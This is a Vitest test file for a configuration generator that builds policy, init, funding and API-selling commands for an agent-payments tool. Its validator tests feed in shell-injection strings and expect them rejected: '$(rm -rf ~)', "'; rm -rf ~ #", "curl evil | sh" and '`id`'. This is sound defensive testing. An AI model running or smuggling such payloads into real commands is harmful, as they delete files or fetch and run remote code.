import { describe, expect, it } from "vitest";
import { formatUsdc6 } from "../../accounting/src/index.js";
import { parsePolicyString } from "../../policy/src/index.js";
import { afterInit, hostOf, inWords, policyString, PRESETS, problems, sellCommand, sellInWords, sellNextSteps, sellProblems, steps, type FactoryInput } from "../src/factory-config.js";

const base: FactoryInput = { client: "claude-desktop", network: "arc", daily: "5", perSeller: "0.5", perPayment: "0.05", perMinute: 60, allow: [], keyFile: "/Users/you/.cra-agent/agent.key" };

describe("what the factory hands to a visitor", () => {
  it("writes limits the real policy parser reads back as the same limits, for every preset", () => {
    for (const p of PRESETS) {
      const input = { ...base, ...p.values };
      expect(problems(input), p.id).toEqual([]);
      const parsed = parsePolicyString(policyString(input));
      expect(formatUsdc6(parsed.dailyCap)).toBe(input.daily);
      expect(formatUsdc6(parsed.perCounterpartyDailyCap)).toBe(input.perSeller);
      expect(formatUsdc6(parsed.perPaymentCap)).toBe(input.perPayment);
      expect(parsed.rateLimit).toEqual({ maxPayments: input.perMinute, windowMs: 60_000 });
      expect(parsed.allowlist).toEqual(input.allow.length ? [...input.allow] : null);
    }
  });

  it("reduces whatever was pasted to the host the policy matches on", () => {
    expect(hostOf(" https://API.Example.com:443/v1/x?y=1 ")).toBe("api.example.com");
    expect(hostOf("api.cra-agent.tech")).toBe("api.cra-agent.tech");
  });

  it("refuses limits that contradict each other, amounts that are not amounts, and paths that would break a shell", () => {
    expect(problems({ ...base, perPayment: "1" })).toHaveLength(1);
    expect(problems({ ...base, perSeller: "9" })).toHaveLength(1);
    expect(problems({ ...base, daily: "five" })).toHaveLength(1);
    expect(problems({ ...base, daily: "0" })).toHaveLength(1);
    expect(problems({ ...base, allow: ["not a host"] })).toHaveLength(1);
    for (const keyFile of ["agent.key", "/tmp/a b.key", "/tmp/$(rm -rf ~).key", "/tmp/a'.key", "/tmp/a`x`.key"]) expect(problems({ ...base, keyFile }), keyFile).toHaveLength(1);
  });

  it("never asks for, shows or transmits a key: only the path of a file the visitor makes themselves", () => {
    for (const client of ["claude-desktop", "claude-code", "cursor", "terminal"] as const) {
      const all = steps({ ...base, client }).map((s) => s.code).join("\n");
      expect(all).not.toMatch(/CRA_PRIVATE_KEY|0x[0-9a-fA-F]{64}/);
      expect(all).toContain("chmod 600");
      expect(all).toContain(base.keyFile);
    }
  });

  it("gives an MCP client valid JSON with the three settings, and says the limits in words", () => {
    const config = JSON.parse(steps(base)[2]!.code);
    expect(config.mcpServers["cra-agent"]).toEqual({ command: "cra-agent-mcp", env: { CRA_NETWORK: "arc", CRA_KEY_FILE: base.keyFile, CRA_POLICY: "daily=5,per_seller=0.5,per_payment=0.05,rate=60/60s" } });
    expect(inWords({ ...base, allow: ["api.cra-agent.tech"] })).toContain("only api.cra-agent.tech");
  });
});

describe("the one command", () => {
  it("is accepted by the real init parser, with the limits intact", async () => {
    const { parseInitArgs } = await import("../../mcp/src/cli/init.js");
    const { oneCommand } = await import("../src/factory-config.js");
    for (const p of PRESETS) {
      const input = { ...base, ...p.values, client: "cursor" as const };
      const line = oneCommand(input, base.keyFile).code;
      expect(line.startsWith("npm i -g @cra-agent/mcp && cra-agent init ")).toBe(true);
      // Split the way a shell would: spaces outside single quotes.
      const argv = [...line.split("cra-agent init ")[1]!.matchAll(/'([^']*)'|(\S+)/g)].map((m) => m[1] ?? m[2]!);
      const parsed = parseInitArgs(argv, "/Users/you");
      expect(parsed).toMatchObject({ client: "cursor", network: "arc", policy: policyString(input), keyFile: base.keyFile });
    }
    expect(oneCommand({ ...base, keyFile: "/opt/keys/a.key" }, base.keyFile).code).toContain("--key-file '/opt/keys/a.key'");
  });
});

describe("the command that starts selling", () => {
  const sell = { target: "https://api.example.com/v1", payTo: "0x33b37c6d7a98b58da3Ccb3F36A4b578053d0Ea74", payToSolana: "CjNFTjvBhbJJd2B5ePPMHRLx1ELZpa8dwQgGL727eKww", lightningFile: "/home/me/.secrets/nwc-receive", lightningFacilitator: true, browserWallets: true, price: "0.002", name: "Milan weather", free: ["/health", "/docs"], network: "arc" as const, publicUrl: "https://pay.example.com" };

  it("is read back by the real cra-agent-sell parser exactly as it was typed", async () => {
    const { parseSellArgs } = await import("../../seller/src/sell-args.js");
    const { sellCommand, sellProblems } = await import("../src/factory-config.js");
    expect(sellProblems(sell)).toEqual([]);
    const line = sellCommand(sell).code;
    expect(line.startsWith("npx -y @cra-agent/seller ")).toBe(true);
    const argv = [...line.slice("npx -y @cra-agent/seller ".length).matchAll(/'([^']*)'|(\S+)/g)].map((m) => m[1] ?? m[2]!);
    expect(parseSellArgs(argv)).toMatchObject({ target: sell.target, payTo: sell.payTo, payToSolana: sell.payToSolana, payToLightning: sell.lightningFile, lightningFacilitatorUrl: "https://api.cra-agent.tech/facilitator", routes: [{ pattern: "/*", price: "$0.002" }], name: "Milan weather", free: ["/health", "/docs"], network: "arc", list: sell.publicUrl, facilitatorUrl: "https://api.cra-agent.tech/facilitator" });
  });

  it("refuses anything that could break out of the quotes it is pasted in", async () => {
    const { sellProblems } = await import("../src/factory-config.js");
    for (const bad of [{ target: "https://a.com/'; rm -rf ~ #" }, { target: "https://a.com/$(whoami)" }, { name: "x'; curl evil | sh #" }, { name: "`id`" }, { free: ["/ok", "/a b"] }, { free: ["health"] }, { payTo: "0x123" }, { payToSolana: "0x33b37c6d7a98b58da3Ccb3F36A4b578053d0Ea74" }, { lightningFile: "nostr+walletconnect://abc?secret=1" }, { lightningFile: "/a b" }, { lightningFile: "/x'; rm -rf ~ #" }, { lightningFile: "~/nwc" }, { lightningFile: "nwc-receive" }, { price: "free" }, { publicUrl: "http://pay.example.com" }]) {
      expect(sellProblems({ ...sell, ...bad }).length, JSON.stringify(bad)).toBeGreaterThan(0);
    }
  });
});

describe("money from where it is, and prices by use", () => {
  it("funds the agent from Base or Solana with the fund command, checked first, and never touches a key", () => {
    const fromBase = steps({ ...base, fundFrom: "base" }).map((x) => x.code).join("\n");
    expect(fromBase).toContain("cra-agent fund 1 --from base --dry-run");
    expect(fromBase).toMatch(/cra-agent fund 1 --from base$/m);
    expect(fromBase).not.toContain("cra-agent deposit");
    const fromSolana = steps({ ...base, fundFrom: "solana" }).map((x) => x.code).join("\n");
    expect(fromSolana).toContain("cra-agent fund 1 --from solana --solana-key-file /full/path/to/solana.json --dry-run");
    for (const all of [fromBase, fromSolana]) expect(all).not.toMatch(/CRA_PRIVATE_KEY|0x[0-9a-fA-F]{64}|\[\d+(,\s*\d+){20,}\]/);
    expect(steps(base).map((x) => x.code).join("\n")).toContain("cra-agent deposit 1");
    expect(afterInit({ ...base, fundFrom: "base" })).toMatch(/USDC on Base.*ETH on Base/);
    expect(afterInit(base)).toMatch(/USDC on Arc/);
  });

  it("sells by use on Arc with our facilitator, and tells the API how to say what a call cost", () => {
    const upto = { target: "https://api.example.com", payTo: "0x33b37c6d7a98b58da3Ccb3F36A4b578053d0Ea74", payToSolana: "", lightningFile: "", lightningFacilitator: false, browserWallets: false, price: "0.10", name: "Renders", free: [], network: "arc" as const, publicUrl: "", upto: true };
    expect(sellProblems(upto)).toEqual([]);
    expect(sellCommand(upto).code).toBe("npx -y @cra-agent/seller --target 'https://api.example.com' --pay-to 0x33b37c6d7a98b58da3Ccb3F36A4b578053d0Ea74 --price 0.10 --name 'Renders' --upto --facilitator cra");
    expect(sellInWords(upto)).toMatch(/up to \$0\.10.*X-Charge-USD/);
    const next = sellNextSteps(upto);
    expect(next.map((x) => x.title)).toEqual(expect.arrayContaining(["Have your API say what each call cost", "Register the wallet that gets paid", "See what you earned"]));
    expect(next.find((x) => x.title === "See what you earned")!.code).toBe("https://explorer.arc.io/address/0x33b37c6d7a98b58da3Ccb3F36A4b578053d0Ea74");
    expect(sellProblems({ ...upto, payToSolana: "CjNFTjvBhbJJd2B5ePPMHRLx1ELZpa8dwQgGL727eKww" })).toEqual([expect.stringMatching(/Arc only/)]);
    expect(sellProblems({ ...upto, lightningFile: "/home/me/.secrets/nwc" })).toEqual([expect.stringMatching(/Arc only/)]);
  });

  it("writes an upto command the real cra-agent-sell parser reads as billed by use", async () => {
    const { parseSellArgs } = await import("../../seller/src/sell-args.js");
    const upto = { target: "https://api.example.com", payTo: "0x33b37c6d7a98b58da3Ccb3F36A4b578053d0Ea74", payToSolana: "", lightningFile: "", lightningFacilitator: false, browserWallets: false, price: "0.10", name: "", free: ["/health"], network: "arc" as const, publicUrl: "", upto: true };
    const line = sellCommand(upto).code;
    const argv = [...line.slice("npx -y @cra-agent/seller ".length).matchAll(/'([^']*)'|(\S+)/g)].map((m) => m[1] ?? m[2]!);
    expect(parseSellArgs(argv)).toMatchObject({ upto: true, facilitatorUrl: "https://api.cra-agent.tech/facilitator", routes: [{ pattern: "/*", price: "$0.10" }], free: ["/health"] });
  });
});
